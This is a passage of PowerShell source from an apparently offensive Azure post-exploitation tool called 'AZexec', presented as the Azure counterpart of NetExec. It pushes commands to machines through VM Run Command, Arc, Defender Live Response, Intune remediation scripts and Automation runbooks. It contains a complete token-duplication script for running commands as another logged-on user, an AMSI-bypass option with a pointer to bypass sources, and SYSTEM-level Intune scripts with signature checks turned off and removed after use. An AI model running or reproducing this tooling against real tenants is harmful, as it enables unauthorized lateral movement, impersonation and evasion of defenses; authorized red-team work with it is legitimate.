    Write-ColorOutput -Message "[*] Failed: $failedExec" -Color $(if ($failedExec -gt 0) { "Red" } else { "Green" })
    Write-ColorOutput -Message "[*] Skipped (not running): $skippedTargets" -Color $(if ($skippedTargets -gt 0) { "Yellow" } else { "Green" })

    # Success rate
    if ($totalTargets -gt 0) {
        $successRate = [Math]::Round(($successfulExec / $totalTargets) * 100, 2)
        Write-ColorOutput -Message "[*] Success Rate: $successRate%" -Color $(if ($successRate -eq 100) { "Green" } elseif ($successRate -ge 50) { "Yellow" } else { "Red" })
    }

    # ============================================
    # EXPORT
    # ============================================
    if ($ExportPath -and $exportData.Count -gt 0) {
        $stats = @{
            "Total Targets" = $totalTargets
            "Successful" = $successfulExec
            "Failed" = $failedExec
            "Skipped" = $skippedTargets
            "Command" = $x
            "Mode" = $execMode
        }
        Export-EnumerationResults -Data $exportData -ExportPath $ExportPath -Title "Remote Command Execution Results" -Statistics $stats -CommandName "exec" -Description "Azure remote command execution results. Equivalent to NetExec -x/-X commands."
    }

    # ============================================
    # NETEXEC COMPARISON
    # ============================================
    Write-ColorOutput -Message "`n[*] NETEXEC COMPARISON:" -Color "Yellow"
    Write-ColorOutput -Message "    NetExec (shell): nxc smb 192.168.1.0/24 -u user -p pass -x 'whoami'" -Color "Gray"
    Write-ColorOutput -Message "    AZexec (shell):  .\azx.ps1 exec -VMName 'vm-01' -x 'whoami'" -Color "Gray"
    Write-ColorOutput -Message "" -Color "White"
    Write-ColorOutput -Message "    NetExec (PS):    nxc smb 192.168.1.0/24 -u user -p pass -X '`$env:COMPUTERNAME'" -Color "Gray"
    Write-ColorOutput -Message "    AZexec (PS):     .\azx.ps1 exec -VMName 'vm-01' -x '`$env:COMPUTERNAME' -PowerShell" -Color "Gray"
    Write-ColorOutput -Message "" -Color "White"
    Write-ColorOutput -Message "    NetExec (multi): nxc smb 192.168.1.0/24 -u user -p pass -x 'hostname'" -Color "Gray"
    Write-ColorOutput -Message "    AZexec (multi):  .\azx.ps1 exec -ResourceGroup 'Prod-RG' -x 'hostname' -AllVMs" -Color "Gray"

    Write-ColorOutput -Message "`n[*] TARGETING OPTIONS:" -Color "Yellow"
    Write-ColorOutput -Message "    VM Targeting:" -Color "White"
    Write-ColorOutput -Message "      -VMName 'vm-01'              Single VM by name" -Color "Gray"
    Write-ColorOutput -Message "      -AllVMs                      All VMs (with optional -ResourceGroup filter)" -Color "Gray"
    Write-ColorOutput -Message "    Device Targeting (Arc-enabled):" -Color "White"
    Write-ColorOutput -Message "      -DeviceName 'LAPTOP-001'     Single Arc device by name" -Color "Gray"
    Write-ColorOutput -Message "      -AllDevices                  All Arc-enabled devices" -Color "Gray"

    Write-ColorOutput -Message "`n[*] EXECUTION METHODS:" -Color "Yellow"
    Write-ColorOutput -Message "    vmrun:      Azure VM Run Command (synchronous - for Azure VMs)" -Color "Gray"
    Write-ColorOutput -Message "    arc:        Azure Arc Run Command (synchronous - for Arc-enabled devices)" -Color "Gray"
    Write-ColorOutput -Message "    mde:        MDE Live Response (async with polling - for MDE-enrolled devices)" -Color "Gray"
    Write-ColorOutput -Message "    intune:     Intune Proactive Remediation (async - for Intune-managed devices)" -Color "Gray"
    Write-ColorOutput -Message "    automation: Azure Automation Hybrid Worker (job-based - for Automation-configured)" -Color "Gray"
    Write-ColorOutput -Message "    pi:         Process Injection via token duplication (execute as target user)" -Color "Gray"
    Write-ColorOutput -Message "    auto:       Auto-detect best method (Arc -> MDE -> Intune)" -Color "Gray"

    Write-ColorOutput -Message "`n[*] PROCESS INJECTION (pi):" -Color "Yellow"
    Write-ColorOutput -Message "    Azure equivalent of NetExec -M pi module" -Color "Gray"
    Write-ColorOutput -Message "    Execute commands as a target user by duplicating their process token" -Color "Gray"
    Write-ColorOutput -Message "" -Color "White"
    Write-ColorOutput -Message "    Underlying Delivery:" -Color "White"
    Write-ColorOutput -Message "      PI auto-detects and uses: vmrun -> arc -> mde -> intune" -Color "Gray"
    Write-ColorOutput -Message "" -Color "White"
    Write-ColorOutput -Message "    Usage:" -Color "White"
    Write-ColorOutput -Message "      -ExecMethod pi -PID 1234           Inject into specific process" -Color "Gray"
    Write-ColorOutput -Message "      -ExecMethod pi -TargetUser 'admin' Auto-find user's process" -Color "Gray"
    Write-ColorOutput -Message "" -Color "White"
    Write-ColorOutput -Message "    Examples:" -Color "White"
    Write-ColorOutput -Message "      .\azx.ps1 exec -VMName 'vm-01' -x 'whoami' -ExecMethod pi -PID 1234" -Color "Gray"
    Write-ColorOutput -Message "      .\azx.ps1 exec -VMName 'vm-01' -x 'whoami' -ExecMethod pi -TargetUser 'DOMAIN\admin'" -Color "Gray"
    Write-ColorOutput -Message "      .\azx.ps1 exec -DeviceName 'LAPTOP' -x 'whoami' -ExecMethod pi -TargetUser 'admin'" -Color "Gray"
    Write-ColorOutput -Message "" -Color "White"
    Write-ColorOutput -Message "    NetExec Equivalent:" -Color "White"
    Write-ColorOutput -Message "      nxc smb <target> -M pi -o PID=1234 EXEC=cmd" -Color "Gray"
    Write-ColorOutput -Message "      nxc smb <target> -M pi -o USER=admin EXEC=cmd" -Color "Gray"

    Write-ColorOutput -Message "`n[*] REQUIRED PERMISSIONS:" -Color "Yellow"
    Write-ColorOutput -Message "    VM Run Command:  Virtual Machine Contributor or Reader + VM Command Executor" -Color "Gray"
    Write-ColorOutput -Message "    Arc Run Command: Azure Connected Machine Resource Administrator" -Color "Gray"
    Write-ColorOutput -Message "    MDE Live Resp:   Machine.LiveResponse, Machine.Read.All (Security API)" -Color "Gray"
    Write-ColorOutput -Message "    Intune:          DeviceManagementManagedDevices.PrivilegedOperations.All" -Color "Gray"
    Write-ColorOutput -Message "    Automation:      Automation Contributor role" -Color "Gray"

    Write-ColorOutput -Message "`n[*] ASYNC VS SYNC METHODS:" -Color "Yellow"
    Write-ColorOutput -Message "    Synchronous (immediate results): vmrun, arc" -Color "Gray"
    Write-ColorOutput -Message "    Asynchronous (polling/delayed):  mde (10 min max), intune (portal results), automation (job-based)" -Color "Gray"

    Write-ColorOutput -Message "`n[*] AMSI BYPASS:" -Color "Yellow"
    Write-ColorOutput -Message "    -AmsiBypass <path>  Prepend AMSI bypass script (PowerShell only)" -Color "Gray"
    Write-ColorOutput -Message "                        Script is prepended before main command" -Color "Gray"
    Write-ColorOutput -Message "                        Get bypasses: github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" -Color "Gray"

    return $exportData
}

# ============================================
# MDE LIVE RESPONSE FUNCTIONS
# ============================================

<#
.SYNOPSIS
    Find a device in Microsoft Defender for Endpoint by name.
.DESCRIPTION
    Queries the MDE Security API to find a machine by its DNS name.
#>
function Get-MDEDevice {
    param(
        [Parameter(Mandatory = $true)]
        [string]$DeviceName,

        [Parameter(Mandatory = $true)]
        [string]$AccessToken
    )

    try {
        $headers = @{
            "Authorization" = "Bearer $AccessToken"
            "Content-Type" = "application/json"
        }

        # Query MDE API for machines
        $uri = "https://api.security.microsoft.com/api/machines"
        $response = Invoke-RestMethod -Method GET -Uri $uri -Headers $headers -ErrorAction Stop

        # Find the device by computer DNS name
        $device = $response.value | Where-Object {
            $_.computerDnsName -eq $DeviceName -or
            $_.computerDnsName -like "$DeviceName.*" -or
            $_.deviceName -eq $DeviceName
        } | Select-Object -First 1

        return $device
    } catch {
        Write-ColorOutput -Message "[!] Error querying MDE API: $($_.Exception.Message)" -Color "Red"
        return $null
    }
}

<#
.SYNOPSIS
    Execute a command via MDE Live Response.
.DESCRIPTION
    Uses the MDE Live Response API to execute a PowerShell script on a device.
    This is asynchronous - the command is queued and results are polled.
#>
function Invoke-MDELiveResponse {
    param(
        [Parameter(Mandatory = $true)]
        [string]$MachineId,

        [Parameter(Mandatory = $true)]
        [string]$Command,

        [Parameter(Mandatory = $true)]
        [string]$AccessToken,

        [int]$Timeout = 600,  # 10 minutes max for RunScript

        [string]$Comment = "AZexec remote execution"
    )

    try {
        $headers = @{
            "Authorization" = "Bearer $AccessToken"
            "Content-Type" = "application/json"
        }

        # Create the Live Response request body
        # Using RunScript command to execute PowerShell
        $body = @{
            Commands = @(
                @{
                    type = "RunScript"
                    params = @(
                        @{ key = "ScriptName"; value = "azexec_command.ps1" }
                        @{ key = "Args"; value = $Command }
                    )
                }
            )
            Comment = $Comment
        } | ConvertTo-Json -Depth 10

        # Submit the Live Response action
        $uri = "https://api.security.microsoft.com/api/machines/$MachineId/runliveresponse"
        $action = Invoke-RestMethod -Method POST -Uri $uri -Headers $headers -Body $body -ErrorAction Stop

        Write-ColorOutput -Message "    [*] Live Response action submitted (ID: $($action.id))" -Color "Yellow"
        Write-ColorOutput -Message "    [*] Polling for results (timeout: $Timeout seconds)..." -Color "Gray"

        # Poll for results
        $startTime = Get-Date
        $actionId = $action.id
        $pollUri = "https://api.security.microsoft.com/api/machineactions/$actionId"

        do {
            Start-Sleep -Seconds 5
            $result = Invoke-RestMethod -Method GET -Uri $pollUri -Headers $headers -ErrorAction Stop

            $elapsed = ((Get-Date) - $startTime).TotalSeconds
            Write-ColorOutput -Message "    [*] Status: $($result.status) (elapsed: $([Math]::Round($elapsed))s)" -Color "Gray"

            if ($elapsed -gt $Timeout) {
                Write-ColorOutput -Message "    [!] Timeout reached - action may still be pending" -Color "Yellow"
                return @{
                    Status = "Timeout"
                    Output = "Action timed out after $Timeout seconds. Action ID: $actionId"
                    ActionId = $actionId
                }
            }
        } while ($result.status -in @("Pending", "InProgress"))

        # Get the command output
        if ($result.status -eq "Succeeded") {
            # Retrieve the actual output from the action
            $outputUri = "https://api.security.microsoft.com/api/machineactions/$actionId/GetLiveResponseResultDownloadLink"
            try {
                $outputLink = Invoke-RestMethod -Method GET -Uri $outputUri -Headers $headers -ErrorAction Stop
                if ($outputLink.value) {
                    $output = Invoke-RestMethod -Method GET -Uri $outputLink.value -ErrorAction SilentlyContinue
                } else {
                    $output = "Command executed successfully (no output available)"
                }
            } catch {
                $output = "Command executed successfully (output retrieval failed: $($_.Exception.Message))"
            }

            return @{
                Status = "Success"
                Output = $output
                ActionId = $actionId
            }
        } else {
            return @{
                Status = "Failed"
                Output = "Action failed with status: $($result.status). Error: $($result.errorHResult)"
                ActionId = $actionId
            }
        }
    } catch {
        return @{
            Status = "Error"
            Output = $_.Exception.Message
            ActionId = $null
        }
    }
}

<#
.SYNOPSIS
    Get an access token for the MDE Security API.
.DESCRIPTION
    Acquires an OAuth2 token for the Microsoft Defender Security API.
#>
function Get-MDEAccessToken {
    try {
        # Try to get token from existing Az context
        $context = Get-AzContext -ErrorAction SilentlyContinue
        if ($context) {
            # Get token for Security API
            $token = Get-AzAccessToken -ResourceUrl "https://api.security.microsoft.com" -ErrorAction Stop
            return $token.Token
        }

        # Fall back to Microsoft Graph context if available
        $mgContext = Get-MgContext -ErrorAction SilentlyContinue
        if ($mgContext) {
            Write-ColorOutput -Message "[*] Note: MDE API requires separate authentication from Microsoft Graph" -Color "Yellow"
            Write-ColorOutput -Message "[*] Please ensure you have 'Machine.LiveResponse' permission configured" -Color "Gray"
        }

        return $null
    } catch {
        Write-ColorOutput -Message "[!] Error acquiring MDE token: $($_.Exception.Message)" -Color "Red"
        return $null
    }
}

# ============================================
# INTUNE PROACTIVE REMEDIATION FUNCTIONS
# ============================================

<#
.SYNOPSIS
    Find a device in Intune by name.
.DESCRIPTION
    Queries Microsoft Graph to find an Intune-managed device by name.
#>
function Get-IntuneDevice {
    param(
        [Parameter(Mandatory = $true)]
        [string]$DeviceName
    )

    try {
        # Ensure Microsoft.Graph module is available
        if (-not (Get-Module -ListAvailable -Name Microsoft.Graph.DeviceManagement)) {
            Write-ColorOutput -Message "[!] Microsoft.Graph.DeviceManagement module not available" -Color "Red"
            return $null
        }

        Import-Module Microsoft.Graph.DeviceManagement -ErrorAction SilentlyContinue

        # Query for the device
        $device = Get-MgDeviceManagementManagedDevice -Filter "deviceName eq '$DeviceName'" -ErrorAction Stop | Select-Object -First 1

        return $device
    } catch {
        Write-ColorOutput -Message "[!] Error querying Intune: $($_.Exception.Message)" -Color "Red"
        return $null
    }
}

<#
.SYNOPSIS
    Execute a command via Intune Proactive Remediation.
.DESCRIPTION
    Uses Intune's on-demand proactive remediation feature to execute a script on a device.
    This is asynchronous - the script is deployed and execution is triggered.
#>
function Invoke-IntuneRemediation {
    param(
        [Parameter(Mandatory = $true)]
        [string]$DeviceId,

        [Parameter(Mandatory = $true)]
        [string]$Command,

        [switch]$PowerShell,

        [string]$DeviceName = "Unknown"
    )

    try {
        # Create the remediation script content
        if ($PowerShell) {
            $scriptContent = $Command
        } else {
            # Wrap shell command in PowerShell
            $scriptContent = "cmd.exe /c `"$Command`""
        }

        # Base64 encode the script
        $scriptBytes = [System.Text.Encoding]::UTF8.GetBytes($scriptContent)
        $encodedScript = [Convert]::ToBase64String($scriptBytes)

        # Create a temporary proactive remediation script
        $remediationBody = @{
            "@odata.type" = "#microsoft.graph.deviceHealthScript"
            displayName = "AZexec-Temp-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            description = "Temporary script created by AZexec for remote execution"
            publisher = "AZexec"
            runAsAccount = "system"
            enforceSignatureCheck = $false
            runAs32Bit = $false
            detectionScriptContent = $encodedScript
            remediationScriptContent = $encodedScript
        }

        Write-ColorOutput -Message "    [*] Creating temporary proactive remediation script..." -Color "Yellow"

        # Create the script via Graph API
        $script = Invoke-MgGraphRequest -Method POST `
            -Uri "https://graph.microsoft.com/beta/deviceManagement/deviceHealthScripts" `
            -Body ($remediationBody | ConvertTo-Json -Depth 10) `
            -ContentType "application/json" `
            -ErrorAction Stop

        $scriptId = $script.id
        Write-ColorOutput -Message "    [*] Script created (ID: $scriptId)" -Color "Gray"

        # Assign the script to the device
        $assignmentBody = @{
            deviceHealthScriptAssignments = @(
                @{
                    target = @{
                        "@odata.type" = "#microsoft.graph.configurationManagerCollectionAssignmentTarget"
                        deviceAndAppManagementAssignmentFilterType = "none"
                    }
                    runRemediationScript = $true
                    runSchedule = @{
                        "@odata.type" = "#microsoft.graph.deviceHealthScriptRunOnceSchedule"
                        interval = 1
                    }
                }
            )
        }

        # Trigger on-demand execution
        Write-ColorOutput -Message "    [*] Triggering on-demand execution on device $DeviceName..." -Color "Yellow"

        $triggerBody = @{
            scriptPolicyId = $scriptId
        }

        try {
            Invoke-MgGraphRequest -Method POST `
                -Uri "https://graph.microsoft.com/beta/deviceManagement/managedDevices/$DeviceId/initiateOnDemandProactiveRemediation" `
                -Body ($triggerBody | ConvertTo-Json) `
                -ContentType "application/json" `
                -ErrorAction Stop

            Write-ColorOutput -Message "    [+] On-demand remediation triggered successfully" -Color "Green"
            Write-ColorOutput -Message "    [*] Note: Intune execution is asynchronous - results available in Intune portal" -Color "Yellow"

            # Clean up: delete the temporary script after a delay
            Start-Sleep -Seconds 2
            try {
                Invoke-MgGraphRequest -Method DELETE `
                    -Uri "https://graph.microsoft.com/beta/deviceManagement/deviceHealthScripts/$scriptId" `
                    -ErrorAction SilentlyContinue
                Write-ColorOutput -Message "    [*] Temporary script cleaned up" -Color "Gray"
            } catch {
                Write-ColorOutput -Message "    [*] Note: Manual cleanup may be needed for script ID: $scriptId" -Color "Gray"
            }

            return @{
                Status = "Triggered"
                Output = "On-demand proactive remediation triggered. Check Intune portal for results."
                ScriptId = $scriptId
            }
        } catch {
            # Clean up the script on failure
            try {
                Invoke-MgGraphRequest -Method DELETE `
                    -Uri "https://graph.microsoft.com/beta/deviceManagement/deviceHealthScripts/$scriptId" `
                    -ErrorAction SilentlyContinue
            } catch { }

            throw $_
        }
    } catch {
        return @{
            Status = "Error"
            Output = $_.Exception.Message
            ScriptId = $null
        }
    }
}

# ============================================
# PROCESS INJECTION FUNCTIONS (Token Manipulation)
# ============================================

<#
.SYNOPSIS
    Generate a PowerShell script for process injection via token duplication.
.DESCRIPTION
    Creates a PowerShell script that uses P/Invoke to:
    1. Find a process owned by the target user (or use provided PID)
    2. Open the process and its token
    3. Duplicate the token with SecurityImpersonation level
    4. Create a new process with the duplicated token
    5. Execute the specified command in the impersonated context

    This is the Azure equivalent of NetExec's process injection (pi) module.
    Since Azure doesn't provide direct memory access, we achieve the same outcome
    (execute as target user) through token manipulation techniques.
#>
function Get-ProcessInjectionScript {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Command,

        [int]$PID,

        [string]$TargetUser
    )

    # PowerShell script that performs token duplication and process creation
    $script = @'
# Process Injection Script - Token Duplication Method
# Azure equivalent of NetExec's -M pi module
# Executes command as target user by duplicating their process token

$ErrorActionPreference = "Stop"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.ComponentModel;

public class TokenManipulation {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool DuplicateTokenEx(
        IntPtr hExistingToken,
        uint dwDesiredAccess,
        IntPtr lpTokenAttributes,
        int ImpersonationLevel,
        int TokenType,
        out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(
        IntPtr hToken,
        uint dwLogonFlags,
        string lpApplicationName,
        string lpCommandLine,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    // Token access rights
    public const uint TOKEN_DUPLICATE = 0x0002;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint TOKEN_IMPERSONATE = 0x0004;
    public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
    public const uint TOKEN_ALL_ACCESS = 0xF01FF;
    public const uint MAXIMUM_ALLOWED = 0x02000000;

    // Process access rights
    public const uint PROCESS_QUERY_INFORMATION = 0x0400;
    public const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;

    // Impersonation levels
    public const int SecurityAnonymous = 0;
    public const int SecurityIdentification = 1;
    public const int SecurityImpersonation = 2;
    public const int SecurityDelegation = 3;

    // Token types
    public const int TokenPrimary = 1;
    public const int TokenImpersonation = 2;

    // Wait constants
    public const uint INFINITE = 0xFFFFFFFF;
    public const uint WAIT_OBJECT_0 = 0x00000000;
}
"@ -ErrorAction SilentlyContinue

$targetPID = TARGETPID_PLACEHOLDER
$targetUser = "TARGETUSER_PLACEHOLDER"
$commandToRun = @"
COMMAND_PLACEHOLDER
"@

Write-Output "[*] Process Injection Module - Token Duplication Method"
Write-Output "[*] Azure equivalent of NetExec -M pi"
Write-Output ""

# Find target process if TargetUser specified
if ($targetPID -eq 0 -and $targetUser -ne "") {
    Write-Output "[*] Searching for process owned by: $targetUser"

    $foundProcess = $null
    $processes = Get-Process | Where-Object { $_.Id -ne $PID }

    foreach ($proc in $processes) {
        try {
            # Get process owner via WMI
            $wmiProc = Get-WmiObject Win32_Process -Filter "ProcessId=$($proc.Id)" -ErrorAction SilentlyContinue
            if ($wmiProc) {
                $owner = $wmiProc.GetOwner()
                if ($owner.ReturnValue -eq 0) {
                    $procOwner = $owner.User
                    $procDomain = $owner.Domain
                    $fullOwner = "$procDomain\$procOwner"

                    # Match against various formats
                    if ($procOwner -eq $targetUser -or
                        $fullOwner -eq $targetUser -or
                        $fullOwner -like "*\$targetUser") {
                        $foundProcess = $proc
                        Write-Output "[+] Found process $($proc.Id) ($($proc.ProcessName)) owned by $fullOwner"
                        $targetPID = $proc.Id
                        break
                    }
                }
            }
        } catch {
            # Skip inaccessible processes
            continue
        }
    }

    if (-not $foundProcess) {
        Write-Output "[!] No process found for user: $targetUser"
        Write-Output "[*] Ensure the user has an active session on this machine"
        exit 1
    }
}

if ($targetPID -eq 0) {
    Write-Output "[!] Error: No target PID specified and no user process found"
    exit 1
}

Write-Output "[*] Target PID: $targetPID"

# Open target process
$hProcess = [TokenManipulation]::OpenProcess(
    [TokenManipulation]::PROCESS_QUERY_LIMITED_INFORMATION,
    $false,
    $targetPID
)

if ($hProcess -eq [IntPtr]::Zero) {
    $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Output "[!] Failed to open process $targetPID (Error: $errorCode)"

    # Try with PROCESS_QUERY_INFORMATION for older Windows versions
    $hProcess = [TokenManipulation]::OpenProcess(
        [TokenManipulation]::PROCESS_QUERY_INFORMATION,
        $false,
        $targetPID
    )

    if ($hProcess -eq [IntPtr]::Zero) {
        $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Output "[!] Also failed with PROCESS_QUERY_INFORMATION (Error: $errorCode)"
        exit 1
    }
}

Write-Output "[+] Process handle obtained"

# Open process token
$hToken = [IntPtr]::Zero
$tokenAccess = [TokenManipulation]::TOKEN_DUPLICATE -bor [TokenManipulation]::TOKEN_QUERY

if (-not [TokenManipulation]::OpenProcessToken($hProcess, $tokenAccess, [ref]$hToken)) {
    $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Output "[!] Failed to open process token (Error: $errorCode)"
    [TokenManipulation]::CloseHandle($hProcess) | Out-Null
    exit 1
}

Write-Output "[+] Process token obtained"

# Duplicate token as primary token
$hNewToken = [IntPtr]::Zero
$dupResult = [TokenManipulation]::DuplicateTokenEx(
    $hToken,
    [TokenManipulation]::MAXIMUM_ALLOWED,
    [IntPtr]::Zero,
    [TokenManipulation]::SecurityImpersonation,
    [TokenManipulation]::TokenPrimary,
    [ref]$hNewToken
)

if (-not $dupResult) {
    $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Output "[!] Failed to duplicate token (Error: $errorCode)"
    [TokenManipulation]::CloseHandle($hToken) | Out-Null
    [TokenManipulation]::CloseHandle($hProcess) | Out-Null
    exit 1
}

Write-Output "[+] Token duplicated successfully"

# Create process with the duplicated token
$si = New-Object TokenManipulation+STARTUPINFO
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$pi = New-Object TokenManipulation+PROCESS_INFORMATION

# Build command line
$cmdLine = "cmd.exe /c $commandToRun"
Write-Output "[*] Executing: $cmdLine"

$createResult = [TokenManipulation]::CreateProcessWithTokenW(
    $hNewToken,
    0,  # dwLogonFlags
    $null,  # lpApplicationName
    $cmdLine,
    0,  # dwCreationFlags
    [IntPtr]::Zero,  # lpEnvironment
    $null,  # lpCurrentDirectory
    [ref]$si,
    [ref]$pi
)

if ($createResult) {
    Write-Output "[+] Process created with impersonated token"
    Write-Output "[+] New process PID: $($pi.dwProcessId)"

    # Wait for process to complete (max 30 seconds)
    $waitResult = [TokenManipulation]::WaitForSingleObject($pi.hProcess, 30000)

    if ($waitResult -eq [TokenManipulation]::WAIT_OBJECT_0) {
        $exitCode = 0
        [TokenManipulation]::GetExitCodeProcess($pi.hProcess, [ref]$exitCode) | Out-Null
        Write-Output "[+] Process completed with exit code: $exitCode"
    } else {
        Write-Output "[*] Process still running after 30 seconds"
    }

    # Cleanup process handles
    [TokenManipulation]::CloseHandle($pi.hProcess) | Out-Null
    [TokenManipulation]::CloseHandle($pi.hThread) | Out-Null
} else {
    $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Output "[!] CreateProcessWithTokenW failed (Error: $errorCode)"

    # Provide guidance based on error code
    switch ($errorCode) {
        5 { Write-Output "[*] Access denied - ensure running as SYSTEM" }
        1314 { Write-Output "[*] Required privilege not held - SeAssignPrimaryTokenPrivilege needed" }
        default { Write-Output "[*] Try running with SYSTEM privileges" }
    }
}

# Cleanup
[TokenManipulation]::CloseHandle($hNewToken) | Out-Null
[TokenManipulation]::CloseHandle($hToken) | Out-Null
[TokenManipulation]::CloseHandle($hProcess) | Out-Null

Write-Output ""
Write-Output "[*] Token manipulation completed"
'@

    # Replace placeholders in the script
    $script = $script -replace 'TARGETPID_PLACEHOLDER', $(if ($PID -and $PID -gt 0) { $PID } else { '0' })
    $script = $script -replace 'TARGETUSER_PLACEHOLDER', $(if ($TargetUser) { $TargetUser } else { '' })

    # Escape the command for embedding in here-string
    $escapedCommand = $Command -replace '"', '""'
    $script = $script -replace 'COMMAND_PLACEHOLDER', $escapedCommand

    return $script
}

# ============================================
# AZURE AUTOMATION FUNCTIONS
# ============================================

<#
.SYNOPSIS
    Execute a command via Azure Automation Hybrid Runbook Worker.
.DESCRIPTION
    Uses Azure Automation to execute a runbook on a Hybrid Worker targeting a specific device.
#>
function Invoke-AutomationExecution {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Command,

        [Parameter(Mandatory = $true)]
        [string]$AutomationAccountName,

        [Parameter(Mandatory = $true)]
        [string]$ResourceGroupName,

        [string]$HybridWorkerGroup,

        [string]$RunbookName = "AZexec-RemoteCommand",

        [switch]$PowerShell,

        [int]$Timeout = 300
    )

    try {
        # Check if Az.Automation module is available
        if (-not (Get-Module -ListAvailable -Name Az.Automation)) {
            Write-ColorOutput -Message "[!] Az.Automation module not available" -Color "Red"
            Write-ColorOutput -Message "[*] Install with: Install-Module Az.Automation" -Color "Yellow"
            return @{
                Status = "Error"
                Output = "Az.Automation module not installed"
                JobId = $null
            }
        }

        Import-Module Az.Automation -ErrorAction SilentlyContinue

        # Check if the runbook exists, if not provide guidance
        $runbook = Get-AzAutomationRunbook `
            -ResourceGroupName $ResourceGroupName `
            -AutomationAccountName $AutomationAccountName `
            -Name $RunbookName `
            -ErrorAction SilentlyContinue

        if (-not $runbook) {
            Write-ColorOutput -Message "[!] Runbook '$RunbookName' not found in Automation Account" -Color "Yellow"
            Write-ColorOutput -Message "[*] To use Azure Automation execution, you need to:" -Color "Cyan"
            Write-ColorOutput -Message "    1. Create a runbook named '$RunbookName' in your Automation Account" -Color "Gray"
            Write-ColorOutput -Message "    2. The runbook should accept a 'Command' parameter" -Color "Gray"
            Write-ColorOutput -Message "    3. Configure a Hybrid Worker Group for target servers" -Color "Gray"
            Write-ColorOutput -Message "" -Color "White"
            Write-ColorOutput -Message "[*] Sample runbook content:" -Color "Cyan"
            Write-ColorOutput -Message '    param([string]$Command)' -Color "Gray"
            Write-ColorOutput -Message '    Invoke-Expression $Command' -Color "Gray"

            return @{
                Status = "Error"
                Output = "Runbook '$RunbookName' not found. Please create it in your Automation Account."
                JobId = $null
            }
        }

        Write-ColorOutput -Message "    [*] Starting Automation runbook job..." -Color "Yellow"

        # Start the runbook
        $jobParams = @{
            Command = $Command
        }

        $startParams = @{
            ResourceGroupName = $ResourceGroupName
            AutomationAccountName = $AutomationAccountName
            Name = $RunbookName
            Parameters = $jobParams
        }

        if ($HybridWorkerGroup) {
            $startParams.RunOn = $HybridWorkerGroup
            Write-ColorOutput -Message "    [*] Targeting Hybrid Worker Group: $HybridWorkerGroup" -Color "Gray"
        }

        $job = Start-AzAutomationRunbook @startParams -ErrorAction Stop

        Write-ColorOutput -Message "    [*] Job started (ID: $($job.JobId))" -Color "Gray"
        Write-ColorOutput -Message "    [*] Waiting for job completion (timeout: $Timeout seconds)..." -Color "Gray"

        # Wait for job completion
        $startTime = Get-Date
        do {
            Start-Sleep -Seconds 5
            $jobStatus = Get-AzAutomationJob `
                -ResourceGroupName $ResourceGroupName `
                -AutomationAccountName $AutomationAccountName `
                -Id $job.JobId `
                -ErrorAction Stop

            $elapsed = ((Get-Date) - $startTime).TotalSeconds
            Write-ColorOutput -Message "    [*] Status: $($jobStatus.Status) (elapsed: $([Math]::Round($elapsed))s)" -Color "Gray"

            if ($elapsed -gt $Timeout) {
                Write-ColorOutput -Message "    [!] Timeout reached - job may still be running" -Color "Yellow"
                return @{
                    Status = "Timeout"
                    Output = "Job timed out after $Timeout seconds. Job ID: $($job.JobId)"
                    JobId = $job.JobId
                }
            }
        } while ($jobStatus.Status -in @("New", "Activating", "Running", "Queued", "Starting"))

        # Get job output
        if ($jobStatus.Status -eq "Completed") {
            $output = Get-AzAutomationJobOutput `
                -ResourceGroupName $ResourceGroupName `
                -AutomationAccountName $AutomationAccountName `
                -Id $job.JobId `
                -Stream Output `
                -ErrorAction SilentlyContinue

            $outputText = ($output | ForEach-Object { $_.Summary }) -join "`n"
            if ([string]::IsNullOrWhiteSpace($outputText)) {
                $outputText = "Job completed successfully (no output)"
            }

            return @{
                Status = "Success"
                Output = $outputText
                JobId = $job.JobId
            }
        } else {
            # Get error output
            $errorOutput = Get-AzAutomationJobOutput `
                -ResourceGroupName $ResourceGroupName `
                -AutomationAccountName $AutomationAccountName `
                -Id $job.JobId `
                -Stream Error `
                -ErrorAction SilentlyContinue

